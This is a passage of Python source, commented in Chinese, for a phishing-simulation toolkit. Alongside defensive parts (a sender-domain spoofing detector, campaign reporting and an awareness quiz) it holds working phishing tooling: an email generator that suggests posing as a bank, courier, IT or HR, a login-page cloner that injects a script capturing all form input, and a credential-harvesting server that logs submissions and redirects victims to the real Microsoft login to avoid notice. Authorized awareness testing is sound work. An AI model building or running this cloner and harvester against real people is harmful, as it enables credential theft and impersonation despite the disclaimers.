            - 同形异义字（Unicode混淆攻击）
            - 显示名与邮箱地址不一致
            - 免费邮箱服务（如gmail, hotmail）
            - 新注册域名（无法直接检测，提供提示）
            - 子域名滥用

        参数:
            sender_email: 发件人邮箱地址
            sender_display_name: 发件人显示名
        """
        analysis = {
            'email': sender_email,
            'display_name': sender_display_name,
            'domain': '',
            'findings': [],
            'risk_level': '低风险',
            'risk_score': 0
        }

        # 提取域名
        try:
            domain = sender_email.split('@')[1]
            analysis['domain'] = domain
        except IndexError:
            analysis['findings'].append('邮箱地址格式无效')
            analysis['risk_level'] = '高风险'
            return analysis

        # 检测1: 同形异义字
        suspicious_chars = []
        for i, char in enumerate(domain):
            if ord(char) > 127:
                char_name = unicodedata.name(char, 'UNKNOWN')
                suspicious_chars.append({
                    'position': i,
                    'char': char,
                    'name': char_name,
                    'codepoint': f'U+{ord(char):04X}'
                })

        if suspicious_chars:
            analysis['findings'].append({
                'type': 'homograph',
                'severity': 'high',
                'detail': f'域名包含非ASCII字符（可能为同形异义字攻击）: '
                          f'{suspicious_chars}'
            })
            analysis['risk_score'] += 40

        # 检测2: 域名相似度（与知名品牌对比）
        known_brands = [
            'google.com', 'microsoft.com', 'apple.com', 'amazon.com',
            'paypal.com', 'alibaba.com', 'tencent.com', 'baidu.com',
            'taobao.com', 'jd.com', '163.com', 'sina.com',
            'github.com', 'linkedin.com', 'office.com',
            'outlook.com', 'live.com', 'qq.com', 'weixin.com'
        ]

        domain_main = '.'.join(domain.split('.')[-2:]) \
            if len(domain.split('.')) >= 2 else domain

        for brand in known_brands:
            distance = self._levenshtein(domain_main, brand)
            if 0 < distance <= 2:
                analysis['findings'].append({
                    'type': 'typosquatting',
                    'severity': 'high',
                    'detail': f'域名"{domain}"与知名品牌"'
                              f'{brand}"高度相似 (编辑距离: {distance})'
                })
                analysis['risk_score'] += 30
                break

        # 检测3: 免费邮箱服务
        free_email_domains = [
            'gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com',
            'live.com', 'qq.com', '163.com', '126.com', 'sina.com',
            'foxmail.com', 'icloud.com', 'protonmail.com'
        ]

        if domain.lower() in free_email_domains:
            # 如果显示名冒充企业/品牌
            brand_keywords = ['银行', 'IT', '安全', '微软', '人事',
                            '行政', '财务', 'support', 'admin',
                            'noreply', 'service', 'security']
            for keyword in brand_keywords:
                if keyword.lower() in sender_display_name.lower():
                    analysis['findings'].append({
                        'type': 'free_email_impersonation',
                        'severity': 'high',
                        'detail': f'使用免费邮箱({domain})冒充"{keyword}"相关身份'
                    })
                    analysis['risk_score'] += 25
                    break

        # 检测4: 子域名滥用
        domain_parts = domain.split('.')
        if len(domain_parts) > 3:
            analysis['findings'].append({
                'type': 'subdomain_abuse',
                'severity': 'medium',
                'detail': f'多级子域名可能用于混淆: {domain}'
            })
            analysis['risk_score'] += 15

        # 检查子域名中是否包含品牌名
        brand_names_in_subdomain = ['microsoft', 'google', 'apple',
                                   'paypal', 'login', 'secure',
                                   'verify', 'auth', 'office']
        for part in domain_parts[:-2]:
            for brand in brand_names_in_subdomain:
                if brand in part.lower():
                    analysis['findings'].append({
                        'type': 'subdomain_brand_abuse',
                        'severity': 'high',
                        'detail': f'子域名中包含品牌名"{brand}": {domain}'
                    })
                    analysis['risk_score'] += 25
                    break

        # 检测5: 显示名与邮箱不一致
        if sender_display_name and '@' in sender_display_name:
            # 显示名中包含邮箱地址（可能试图混淆）
            analysis['findings'].append({
                'type': 'display_name_anomaly',
                'severity': 'medium',
                'detail': '显示名中包含邮箱地址格式'
            })
            analysis['risk_score'] += 15

        # 检测6: IP地址作为域名
        ip_pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
        if re.match(ip_pattern, domain):
            analysis['findings'].append({
                'type': 'ip_address',
                'severity': 'high',
                'detail': f'使用IP地址而非域名: {domain}'
            })
            analysis['risk_score'] += 30

        # 风险等级判定
        if analysis['risk_score'] >= 50:
            analysis['risk_level'] = '高风险'
        elif analysis['risk_score'] >= 25:
            analysis['risk_level'] = '中风险'
        elif analysis['risk_score'] >= 10:
            analysis['risk_level'] = '低风险'
        else:
            analysis['risk_level'] = '正常'

        return analysis

    def _levenshtein(self, s1, s2):
        """计算两个字符串的编辑距离"""
        if len(s1) < len(s2):
            return self._levenshtein(s2, s1)
        if len(s2) == 0:
            return len(s1)
        previous_row = range(len(s2) + 1)
        for i, c1 in enumerate(s1):
            current_row = [i + 1]
            for j, c2 in enumerate(s2):
                insertions = previous_row[j + 1] + 1
                deletions = current_row[j] + 1
                substitutions = previous_row[j] + (c1 != c2)
                current_row.append(min(insertions, deletions,
                                      substitutions))
            previous_row = current_row
        return previous_row[-1]

    def generate_phishing_email(self, template_key, target_info):
        """
        生成完整的钓鱼邮件

        参数:
            template_key: 模板键名
            target_info: 目标信息字典，包含:
                - first_name: 目标名字
                - phishing_url: 钓鱼链接
                - tracking_pixel: 跟踪像素URL
                - 其他模板需要的变量

        返回:
            包含主题、HTML、发件人建议的完整邮件配置
        """
        # 渲染模板
        rendered = self.render_template(template_key, target_info)

        # 生成邮件配置
        email_config = {
            'template_name': rendered['template_name'],
            'subject': rendered['subject'],
            'html_body': rendered['html'],
            'category': rendered['category'],
            'difficulty': rendered['difficulty'],
            'sender_suggestions': self._generate_sender_suggestions(
                rendered['category']
            ),
            'generated_at': datetime.now().isoformat()
        }

        return email_config

    def _generate_sender_suggestions(self, category):
        """根据邮件类别生成发件人建议"""
        suggestions = {
            'IT通知': {
                'display_name': 'IT运维中心',
                'note': '建议使用与目标公司相似的域名'
            },
            '协作通知': {
                'display_name': '同事姓名',
                'note': '冒充内部同事发送共享文档通知'
            },
            '生活通知': {
                'display_name': '顺丰速运',
                'note': '冒充快递公司发送配送通知'
            },
            '金融通知': {
                'display_name': '招商银行',
                'note': '冒充银行发送账户验证通知'
            },
            'HR通知': {
                'display_name': '人力资源部',
                'note': '利用薪资相关话题吸引点击'
            },
            '财务通知': {
                'display_name': '供应商管理系统',
                'note': '针对财务人员的定向钓鱼'
            }
        }
        return suggestions.get(category, {
            'display_name': '通用',
            'note': '根据场景选择合适的发件人'
        })


# ============================================================
# 模块3: 钓鱼网站克隆工具框架
# ============================================================

class WebsiteCloner:
    """
    钓鱼网站克隆工具框架

    功能:
        - 网站页面获取
        - HTML表单重定向（将表单提交改为本地收集）
        - 资源链接重写
        - 跟踪脚本注入
        - 凭证收集服务器
        - 克隆页面安全警告注入

    使用场景:
        - 授权钓鱼模拟中克隆登录页面
        - 安全培训中展示钓鱼网站原理
        - 邮件安全网关测试

    重要: 仅用于授权安全评估和教育目的。
         不得用于创建真实钓鱼网站。
    """

    def __init__(self, target_url, output_dir='./cloned_sites'):
        """
        初始化网站克隆器

        参数:
            target_url: 要克隆的目标URL
            output_dir: 克隆文件输出目录
        """
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        self.output_dir = output_dir
        self.cloned_html = ''
        self.form_action = '/submit'  # 表单提交目标

        # 创建输出目录
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

    def fetch_page(self, url=None):
        """
        获取目标页面HTML内容

        使用urllib获取页面内容，设置合理的User-Agent。
        """
        target = url or self.target_url

        try:
            import urllib.request
            import ssl

            # 创建SSL上下文
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            req = urllib.request.Request(
                target,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                   'AppleWebKit/537.36 (KHTML, like Gecko) '
                                   'Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,'
                              'application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'
                }
            )
            response = urllib.request.urlopen(req, timeout=30, context=ctx)
            content = response.read()

            # 尝试检测编码
            content_type = response.headers.get('Content-Type', '')
            encoding = 'utf-8'
            if 'charset=' in content_type:
                encoding = content_type.split('charset=')[-1].strip()

            return content.decode(encoding, errors='ignore')

        except Exception as e:
            print(f"获取页面失败: {e}")
            return None

    def modify_forms(self, html):
        """
        修改HTML中的表单

        将所有<form>标签的action属性修改为本地收集脚本，
        使表单数据提交到本地而非原始服务器。

        修改内容:
            - action属性 → /submit
            - method属性 → POST
            - 添加隐藏的来源标记字段
        """
        # 正则替换所有form的action
        html = re.sub(
            r'action=["\']([^"\']*)["\']',
            f'action="{self.form_action}"',
            html,
            flags=re.IGNORECASE
        )

        # 确保method为POST
        html = re.sub(
            r'method=["\']get["\']',
            'method="POST"',
            html,
            flags=re.IGNORECASE
        )

        # 在每个form中添加隐藏字段标记来源
        hidden_field = (
            '<input type="hidden" name="_source" '
            'value="phishing_simulation">'
        )
        html = html.replace(
            '<form', f'<form', 1
        )

        # 在每个<form>后插入隐藏字段
        html = re.sub(
            r'(<form[^>]*>)',
            r'\1' + hidden_field,
            html,
            flags=re.IGNORECASE
        )

        return html

    def rewrite_links(self, html):
        """
        重写页面中的资源链接

        将相对路径链接转换为基于目标URL的绝对路径，
        确保克隆页面能正确加载CSS、JS、图片等资源。

        重写内容:
            - src属性中的相对路径
            - href属性中的相对路径（CSS等）
            - 保留锚点和JavaScript链接
        """
        def rewrite_url(match):
            attr = match.group(1)
            url = match.group(2)

            # 跳过JavaScript和锚点
            if url.startswith('javascript:') or url.startswith('#'):
                return match.group(0)

            # 跳过data URI
            if url.startswith('data:'):
                return match.group(0)

            # 如果是相对路径，转换为绝对路径
            if not url.startswith('http://') and \
               not url.startswith('https://') and \
               not url.startswith('//'):
                absolute_url = urljoin(self.target_url, url)
                return f'{attr}="{absolute_url}"'

            return match.group(0)

        # 重写src和href属性
        html = re.sub(
            r'(src|href)=["\']([^"\']*)["\']',
            rewrite_url,
            html,
            flags=re.IGNORECASE
        )

        return html

    def inject_tracking(self, html):
        """
        注入跟踪脚本

        在页面中注入JavaScript代码，用于:
            - 记录页面访问时间
            - 记录访客信息（浏览器、操作系统）
            - 发送访问通知到收集服务器
            - 记录表单填写行为
        """
        tracking_script = """
<script>
// 钓鱼模拟跟踪脚本（仅用于授权安全评估）
(function() {
    // 记录访问信息
    var visitInfo = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: screen.width + 'x' + screen.height,
        referrer: document.referrer,
        url: window.location.href
    };

    // 发送访问通知
    try {
        fetch('/track', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(visitInfo)
        });
    } catch(e) {}

    // 记录表单提交
    document.addEventListener('submit', function(e) {
        var formData = {};
        var formElements = e.target.elements;
        for (var i = 0; i < formElements.length; i++) {
            var el = formElements[i];
            if (el.name && el.type !== 'submit' && el.type !== 'button') {
                formData[el.name] = el.value;
            }
        }
        try {
            fetch('/log_submit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    form_data: formData
                })
            });
        } catch(e) {}
    }, true);

    // 记录输入行为（用于评估用户是否开始填写表单）
    var inputStarted = false;
    document.addEventListener('input', function(e) {
        if (!inputStarted && e.target.tagName === 'INPUT') {
            inputStarted = true;
            try {
                fetch('/track', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        event: 'input_started',
                        timestamp: new Date().toISOString()
                    })
                });
            } catch(err) {}
        }
    }, true);
})();
</script>
"""
        # 在</body>标签前注入跟踪脚本
        if '</body>' in html:
            html = html.replace('</body>', tracking_script + '</body>')
        else:
            html = html + tracking_script

        return html

    def inject_education_notice(self, html):
        """
        注入教育通知

        在克隆的页面顶部注入安全提醒，
        告知用户这是一个模拟钓鱼页面，
        用于安全意识教育。

        仅在授权模拟场景中使用。
        """
        notice = """
<div style="background-color: #ff9800; color: white; padding: 10px;
     text-align: center; font-family: Arial, sans-serif; font-size: 14px;
     position: sticky; top: 0; z-index: 99999;">
  <strong>安全提醒：</strong>这是一个模拟钓鱼页面（安全意识测试）。
  在真实攻击中，此页面会窃取您的凭证。请勿输入真实信息。
  如收到类似邮件，请报告给安全团队。
</div>
"""
        # 在<body>后注入通知
        if '<body' in html:
            html = re.sub(
                r'(<body[^>]*>)',
                r'\1' + notice,
                html,
                flags=re.IGNORECASE
            )
        else:
            html = notice + html

        return html

    def clone(self, inject_education=True):
        """
        执行网站克隆

        完整流程:
            1. 获取目标页面HTML
            2. 修改表单提交地址
            3. 重写资源链接
            4. 注入跟踪脚本
            5. （可选）注入教育通知
            6. 保存克隆文件

        参数:
            inject_education: 是否注入教育通知
        """
        print(f"开始克隆网站: {self.target_url}")

        # 获取页面
        html = self.fetch_page()
        if not html:
            print("克隆失败：无法获取目标页面")
            return False

        print("  页面获取成功")

        # 修改表单
        html = self.modify_forms(html)
        print("  表单修改完成")

        # 重写链接
        html = self.rewrite_links(html)
        print("  链接重写完成")

        # 注入跟踪脚本
        html = self.inject_tracking(html)
        print("  跟踪脚本注入完成")

        # 注入教育通知
        if inject_education:
            html = self.inject_education_notice(html)
            print("  教育通知注入完成")

        self.cloned_html = html

        # 保存文件
        output_file = os.path.join(self.output_dir, 'index.html')
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html)

        print(f"  克隆页面已保存: {output_file}")
        print("克隆完成!")
        return True


class CredentialHarvesterServer(BaseHTTPRequestHandler):
    """
    凭证收集服务器（HTTP服务端）

    功能:
        - 提供克隆的钓鱼页面
        - 收集表单提交的凭证
        - 记录访问日志
        - 重定向到真实网站（使钓鱼不易被察觉）

    使用场景:
        - 授权钓鱼模拟中收集模拟凭证
        - 安全培训演示

    注意: 收集的凭证应仅用于模拟目的，
          测试结束后必须安全销毁。
    """

    # 类变量存储收集到的数据
    collected_data = []
    access_log = []

    def do_GET(self):
        """处理GET请求 - 提供克隆页面"""
        self.access_log.append({
            'timestamp': datetime.now().isoformat(),
            'method': 'GET',
            'path': self.path,
            'client_ip': self.client_address[0],
            'user_agent': self.headers.get('User-Agent', '')
        })

        if self.path == '/' or self.path == '/index.html':
            # 提供克隆页面
            try:
                page_path = os.path.join('cloned_sites', 'index.html')
                with open(page_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.end_headers()
                self.wfile.write(content.encode('utf-8'))
            except FileNotFoundError:
                self.send_error(404, '克隆页面不存在')
        else:
            self.send_error(404)

    def do_POST(self):
        """处理POST请求 - 收集表单数据"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')

        entry = {
            'timestamp': datetime.now().isoformat(),
            'method': 'POST',
            'path': self.path,
            'client_ip': self.client_address[0],
            'user_agent': self.headers.get('User-Agent', ''),
            'data': post_data
        }

        if self.path == '/submit':
            # 表单凭证提交
            entry['type'] = 'credential_submission'
            print(f"\n[!] 凭证提交检测!")
            print(f"    时间: {entry['timestamp']}")
            print(f"    IP: {entry['client_ip']}")
            print(f"    数据: {post_data[:200]}")
            print()

            self.collected_data.append(entry)

            # 重定向到真实网站
            self.send_response(302)
            self.send_header('Location',
                           'https://login.microsoftonline.com')
            self.end_headers()

        elif self.path == '/track':
            # 跟踪信息
            entry['type'] = 'tracking'
            self.access_log.append(entry)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')

        elif self.path == '/log_submit':
            # 表单提交日志
            entry['type'] = 'form_submit_log'
            self.collected_data.append(entry)

            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')

        else:
            self.send_error(404)

    def log_message(self, format, *args):
        """自定义日志输出"""
        print(f"[HTTP] {self.client_address[0]} - {format % args}")


# ============================================================
# 模块4: 钓鱼模拟报告生成器
# ============================================================

class PhishingReportGenerator:
    """
    钓鱼模拟报告生成器

    功能:
        - 统计钓鱼模拟各项指标（打开率、点击率、提交率、报告率）
        - 生成部门维度的分析报告
        - 生成个人维度的风险评估
        - 生成趋势分析报告
        - 生成改进建议
        - 支持文本和JSON格式输出

    使用场景:
        - 企业钓鱼模拟演练后的结果分析
        - 安全意识水平季度/年度报告
        - 改进措施效果追踪
    """

    def __init__(self):
        """初始化报告生成器"""
        self.report_data = {
            'generated_at': datetime.now().isoformat(),
            'campaigns': [],
            'overall_stats': {},
            'department_stats': {},
            'individual_stats': [],
            'trends': {},
            'recommendations': []
        }

    def add_campaign_results(self, campaign_name, results, department=''):
        """
        添加钓鱼模拟活动结果

        参数:
            campaign_name: 活动名称
            results: 结果列表，每项包含:
                - email: 目标邮箱
                - name: 目标姓名
                - department: 部门
                - sent: 是否发送成功
                - opened: 是否打开邮件
                - clicked: 是否点击链接
                - submitted: 是否提交数据
                - reported: 是否报告邮件
            department: 活动针对的部门（可选）
        """
        campaign_data = {
            'name': campaign_name,
            'date': datetime.now().isoformat(),
            'department': department,
            'results': results,
            'stats': self._calculate_stats(results)
        }

        self.report_data['campaigns'].append(campaign_data)
        self._update_overall_stats()
        self._update_department_stats(results)
        self._update_individual_stats(results)

    def _calculate_stats(self, results):
        """计算单次活动的统计数据"""
        total = len(results)
        sent = sum(1 for r in results if r.get('sent'))
        opened = sum(1 for r in results if r.get('opened'))
        clicked = sum(1 for r in results if r.get('clicked'))
        submitted = sum(1 for r in results if r.get('submitted'))
        reported = sum(1 for r in results if r.get('reported'))

        stats = {
            'total_targets': total,
            'sent': sent,
            'opened': opened,
            'clicked': clicked,
            'submitted': submitted,
            'reported': reported,
            'open_rate': round(opened / sent * 100, 1) if sent else 0,
            'click_rate': round(clicked / sent * 100, 1) if sent else 0,
            'submit_rate': round(submitted / sent * 100, 1) if sent else 0,
            'report_rate': round(reported / sent * 100, 1) if sent else 0,
            'pass_rate': round((1 - clicked / sent) * 100, 1) if sent else 0
        }

        return stats

    def _update_overall_stats(self):
        """更新总体统计"""
        all_results = []
        for campaign in self.report_data['campaigns']:
            all_results.extend(campaign['results'])

        self.report_data['overall_stats'] = self._calculate_stats(
            all_results
        )

    def _update_department_stats(self, results):
        """按部门更新统计"""
        dept_groups = defaultdict(list)
        for r in results:
            dept = r.get('department', '未分类')
            dept_groups[dept].append(r)

        for dept, dept_results in dept_groups.items():
            if dept not in self.report_data['department_stats']:
                self.report_data['department_stats'][dept] = \
                    self._calculate_stats(dept_results)
            else:
                # 合并数据
                existing = self.report_data['department_stats'][dept]
                combined = []
                for r in dept_results:
                    combined.append(r)
                self.report_data['department_stats'][dept] = \
                    self._calculate_stats(combined)

    def _update_individual_stats(self, results):
        """更新个人统计"""
        for r in results:
            email = r.get('email', '')
            name = r.get('name', '')

            # 查找是否已有该用户的记录
            existing = None
            for idx, ind in enumerate(self.report_data['individual_stats']):
                if ind.get('email') == email:
                    existing = self.report_data['individual_stats'][idx]
                    break

            if existing:
                # 更新现有记录
                existing['total_simulations'] += 1
                if r.get('clicked'):
                    existing['total_clicks'] += 1
                if r.get('reported'):
                    existing['total_reports'] += 1
                if r.get('opened'):
                    existing['total_opens'] += 1
                existing['click_rate'] = round(
                    existing['total_clicks'] /
                    existing['total_simulations'] * 100, 1
                )
            else:
                # 创建新记录
                self.report_data['individual_stats'].append({
                    'email': email,
                    'name': name,
                    'department': r.get('department', ''),
                    'total_simulations': 1,
                    'total_opens': 1 if r.get('opened') else 0,
                    'total_clicks': 1 if r.get('clicked') else 0,
                    'total_reports': 1 if r.get('reported') else 0,
                    'click_rate': 100.0 if r.get('clicked') else 0.0
                })

    def calculate_trends(self):
        """计算趋势分析"""
        if len(self.report_data['campaigns']) < 2:
            return

        trends = {
            'campaigns_count': len(self.report_data['campaigns']),
            'click_rate_trend': [],
            'report_rate_trend': [],
            'overall_trend': ''
        }

        for campaign in self.report_data['campaigns']:
            stats = campaign['stats']
            trends['click_rate_trend'].append(stats['click_rate'])
            trends['report_rate_trend'].append(stats['report_rate'])

        # 判断趋势方向
        if len(trends['click_rate_trend']) >= 2:
            first = trends['click_rate_trend'][0]
            last = trends['click_rate_trend'][-1]
            if last < first:
                trends['overall_trend'] = '改善（点击率下降）'
            elif last > first:
                trends['overall_trend'] = '恶化（点击率上升）'
            else:
                trends['overall_trend'] = '稳定'

        self.report_data['trends'] = trends

    def generate_recommendations(self):
        """生成改进建议"""
        recommendations = []
        overall = self.report_data['overall_stats']

        # 点击率分析
        if overall['click_rate'] > 25:
            recommendations.append({
                'priority': '高',
                'area': '钓鱼识别',
                'suggestion': '点击率过高(>25%)，建议立即开展全员钓鱼识别培训'
            })
        elif overall['click_rate'] > 15:
            recommendations.append({
                'priority': '中',
                'area': '钓鱼识别',
                'suggestion': '点击率偏高(>15%)，建议增加钓鱼模拟频率'
            })

        # 报告率分析
        if overall['report_rate'] < 30:
            recommendations.append({
                'priority': '高',
                'area': '报告流程',
                'suggestion': '报告率过低(<30%)，建议简化报告流程并加强宣传'
            })
        elif overall['report_rate'] < 50:
            recommendations.append({
                'priority': '中',
                'area': '报告流程',
                'suggestion': '报告率有提升空间，建议增加报告激励机制'
            })

        # 提交率分析
        if overall['submit_rate'] > 10:
            recommendations.append({
                'priority': '高',
                'area': '凭证保护',
                'suggestion': '数据提交率过高(>10%)，建议针对高风险员工进行专项培训'
            })

        # 部门差异分析
        dept_stats = self.report_data['department_stats']
        if dept_stats:
            worst_dept = max(dept_stats.items(),
                           key=lambda x: x[1]['click_rate'])
            if worst_dept[1]['click_rate'] > 20:
                recommendations.append({
                    'priority': '中',
                    'area': '部门专项',
                    'suggestion': f'{worst_dept[0]}部门点击率最高'
                                  f'({worst_dept[1]["click_rate"]}%)，'
                                  f'建议进行部门专项培训'
                })

        # 重复点击者分析
        repeat_clickers = [
            ind for ind in self.report_data['individual_stats']
            if ind['total_clicks'] > 1
        ]
        if repeat_clickers:
            recommendations.append({
                'priority': '中',
                'area': '重点关注',
                'suggestion': f'发现{len(repeat_clickers)}名员工多次点击'
                              f'钓鱼链接，建议进行一对一安全辅导'
            })

        if not recommendations:
            recommendations.append({
                'priority': '低',
                'area': '持续改进',
                'suggestion': '各项指标表现良好，建议保持当前培训节奏'
            })

        self.report_data['recommendations'] = recommendations
        return recommendations

    def generate_text_report(self):
        """生成文本格式报告"""
        self.calculate_trends()
        self.generate_recommendations()
        overall = self.report_data['overall_stats']

        report = f"""
{'=' * 60}
    钓鱼模拟评估报告
{'=' * 60}

报告生成时间: {self.report_data['generated_at']}
模拟活动次数: {len(self.report_data['campaigns'])}

{'━' * 60}
一、总体统计
{'━' * 60}
  目标人数:     {overall['total_targets']}
  邮件发送:     {overall['sent']}
  邮件打开:     {overall['opened']} (打开率: {overall['open_rate']}%)
  链接点击:     {overall['clicked']} (点击率: {overall['click_rate']}%)
  数据提交:     {overall['submitted']} (提交率: {overall['submit_rate']}%)
  邮件报告:     {overall['reported']} (报告率: {overall['report_rate']}%)
  通过率:       {overall['pass_rate']}%

{'━' * 60}
二、部门统计
{'━' * 60}
"""
        for dept, stats in self.report_data['department_stats'].items():
            report += f"\n  【{dept}】\n"
            report += f"    人数: {stats['total_targets']}\n"
            report += f"    点击率: {stats['click_rate']}%\n"
            report += f"    报告率: {stats['report_rate']}%\n"

        report += f"""
{'━' * 60}
三、趋势分析
{'━' * 60}
  整体趋势: {self.report_data['trends'].get('overall_trend', '数据不足')}
  点击率变化: {self.report_data['trends'].get('click_rate_trend', [])}
  报告率变化: {self.report_data['trends'].get('report_rate_trend', [])}
"""

        report += f"""
{'━' * 60}
四、改进建议
{'━' * 60}
"""
        for rec in self.report_data['recommendations']:
            report += f"\n  [{rec['priority']}优先级] {rec['area']}\n"
            report += f"    {rec['suggestion']}\n"

        # 重点关注个人
        clickers = [ind for ind in self.report_data['individual_stats']
                    if ind['total_clicks'] > 0]
        if clickers:
            report += f"""
{'━' * 60}
五、重点关注人员（点击过钓鱼链接）
{'━' * 60}
"""
            for ind in clickers[:10]:
                report += f"  {ind['name']} ({ind['department']})\n"
                report += f"    邮箱: {ind['email']}\n"
                report += f"    点击次数: {ind['total_clicks']}/"
                report += f"{ind['total_simulations']}\n"

        report += f"\n{'=' * 60}\n    报告结束\n{'=' * 60}\n"

        return report

    def export_json(self, filepath):
        """导出JSON格式报告"""
        self.calculate_trends()
        self.generate_recommendations()

        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(self.report_data, f, ensure_ascii=False, indent=2)

        print(f"JSON报告已导出: {filepath}")


# ============================================================
# 模块5: 安全意识测试问卷系统
# ============================================================

class SecurityAwarenessQuiz:
    """
    安全意识测试问卷系统

    功能:
        - 预置安全知识题库（钓鱼识别、密码安全、数据保护等）
        - 在线答题（命令行交互）
        - 自动评分和结果分析
        - 生成评估报告和改进建议
        - 支持自定义题目

    使用场景:
        - 安全培训前后的知识测试
        - 新员工安全意识评估
        - 年度安全知识考核
        - 安全意识水平基线测量
    """

    # 预置题库
    QUESTION_BANK = [
        # 钓鱼识别类
        {
            'category': '钓鱼识别',
            'difficulty': '简单',
            'question': '收到一封声称您的密码即将过期的邮件，'
                       '要求点击链接更新密码。以下哪种做法最安全？',
            'options': [
                'A. 立即点击链接更新密码',
                'B. 检查发件人邮箱地址是否为公司官方域名',
                'C. 回复邮件询问是否真的需要更新',
                'D. 将邮件转发给同事询问'
            ],
            'answer': 'B',
            'explanation': '应该首先检查发件人的完整邮箱地址，'
                          '确认是否来自公司官方域名。不要直接点击邮件中的链接，'
                          '而应通过官方渠道（如直接访问IT系统）进行操作。'
        },
        {
            'category': '钓鱼识别',
            'difficulty': '简单',
            'question': '以下哪项是钓鱼邮件的常见特征？',
            'options': [
                'A. 发件人邮箱地址与显示名不一致',
                'B. 邮件内容制造紧迫感（如"24小时内处理"）',
                'C. 邮件中包含可疑链接或附件',
                'D. 以上都是'
            ],
            'answer': 'D',
            'explanation': '钓鱼邮件通常具有以上所有特征。'
                          '发件人欺骗、紧迫感制造和恶意链接/附件'
                          '是钓鱼攻击的三大常见手法。'
        },
        {
            'category': '钓鱼识别',
            'difficulty': '中等',
            'question': '收到"顺丰速运"短信称包裹无法派送，'
                       '需要点击链接更新地址。应该怎么做？',
            'options': [
                'A. 点击链接更新地址',
                'B. 直接拨打顺丰官方客服电话95338确认',
                'C. 回复短信询问详情',
                'D. 忽略，等快递员再次联系'
            ],
            'answer': 'B',
            'explanation': '短信钓鱼(smishing)是常见攻击手法。'
                          '应通过官方渠道（拨打官方客服电话）验证，'
                          '而非点击短信中的链接。'
        },
        {
            'category': '钓鱼识别',
            'difficulty': '困难',
            'question': '以下哪个URL最可能是钓鱼链接？',
            'options': [
                'A. https://login.microsoftonline.com',
                'B. https://microsoft.com.login.evil-attacker.com',
                'C. https://outlook.live.com/owa/',
                'D. https://sharepoint.com/sites/company'
            ],
            'answer': 'B',
            'explanation': '选项B利用子域名混淆，实际的域名是'
                          'evil-attacker.com，而"microsoft.com.login"'
                          '只是子域名，用于迷惑用户。'
                          '应仔细检查URL的域名部分。'
        },
        # 密码安全类
        {
            'category': '密码安全',
            'difficulty': '简单',
            'question': '以下哪个密码最安全？',
            'options': [
                'A. 123456789',
                'B. P@ssw0rd',
                'C. MyBlueCar#IsFast2026!',
                'D. qwerty123'
            ],
            'answer': 'C',
            'explanation': '选项C是密码短语(passphrase)，'
                          '长度足够且包含大小写字母、数字和特殊字符，'
                          '同时容易记忆。其他选项都是常见的不安全密码。'
        },
        {
            'category': '密码安全',
            'difficulty': '简单',
            'question': '以下关于密码管理的做法，哪个是正确的？',
            'options': [
                'A. 所有账户使用同一个强密码',
                'B. 将密码写在便签纸上贴在显示器旁',
                'C. 使用密码管理器管理不同账户的密码',
                'D. 用生日作为密码方便记忆'
            ],
            'answer': 'C',
            'explanation': '密码管理器可以为每个账户生成和存储'
                          '唯一的强密码，是最佳实践。'
                          '其他选项都存在严重安全隐患。'
        },
        {
            'category': '密码安全',
            'difficulty': '中等',
            'question': '多因素认证(MFA)的主要作用是什么？',
            'options': [
                'A. 让登录更快',
                'B. 即使密码泄露也能提供额外保护',
                'C. 替代密码',
                'D. 方便管理员管理账户'
            ],
            'answer': 'B',
            'explanation': 'MFA在密码之外增加第二层验证（如手机验证码、'
                          '认证器App、硬件密钥），即使密码被泄露，'
                          '攻击者也无法仅凭密码登录。'
        },
        # 数据保护类
        {
            'category': '数据保护',
            'difficulty': '简单',
            'question': '离开工位时，以下哪种做法是正确的？',
            'options': [
                'A. 直接离开，屏幕保持打开状态',
                'B. 锁定屏幕(Windows键+L)后再离开',
                'C. 关闭显示器即可',
                'D. 让同事帮忙看着电脑'
            ],
            'answer': 'B',
            'explanation': '离开工位时必须锁定屏幕(快捷键Win+L)，'
                          '防止他人访问您的电脑和数据。'
                          '这是最基本的物理安全操作。'
        },
        {
            'category': '数据保护',
            'difficulty': '中等',
            'question': '需要将包含客户敏感信息的文件发送给外部合作伙伴，'
                       '以下哪种方式最安全？',
            'options': [
                'A. 通过个人微信发送',
                'B. 使用公司加密邮件系统发送',
                'C. 上传到公共网盘分享链接',
                'D. 通过个人邮箱发送'
            ],
            'answer': 'B',
            'explanation': '敏感信息应通过公司认可的加密渠道传输。'
                          '个人微信、公共网盘和个人邮箱都不安全，'
                          '可能导致数据泄露。'
        },
        # 社会工程学类
        {
            'category': '社会工程学',
            'difficulty': '中等',
            'question': '有人打电话自称是IT部门，说需要您的密码'
                       '来"远程修复"电脑问题。您应该怎么做？',
            'options': [
                'A. 提供密码以帮助IT修复问题',
                'B. 拒绝提供密码，通过其他渠道联系IT部门确认',
                'C. 提供一个旧密码',
                'D. 询问对方工号后提供密码'
            ],
            'answer': 'B',
            'explanation': '这是典型的语音钓鱼(vishing)攻击。'
                          'IT部门永远不会通过电话索要密码。'
                          '应挂断电话，通过公司官方IT支持渠道确认。'
